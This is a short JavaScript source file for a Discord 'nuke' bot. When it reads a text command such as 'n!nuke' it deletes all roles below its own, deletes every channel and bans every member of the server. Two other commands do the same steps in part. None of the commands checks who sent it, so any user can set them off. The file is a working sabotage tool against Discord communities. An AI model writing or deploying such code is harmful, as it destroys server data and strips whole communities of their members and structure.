const discord = require("discord.js");
const { prefix } = require('./config.json');
const client = new discord.Client();

client.on("ready", () =>{
console.log(" ")
console.log(`${client.user.tag} is online.`);

});

client.on("message", async(msg)=>{

if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("your ban message here"));
}
if(msg.content.toLowerCase().startsWith(`${prefix}` + "orgia mode")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith(`${prefix}` + "buster mode")){
    msg.guild.members.tap(member => member.ban("<your ban message here>"));
}
});

client.login(process.env.TOKEN)
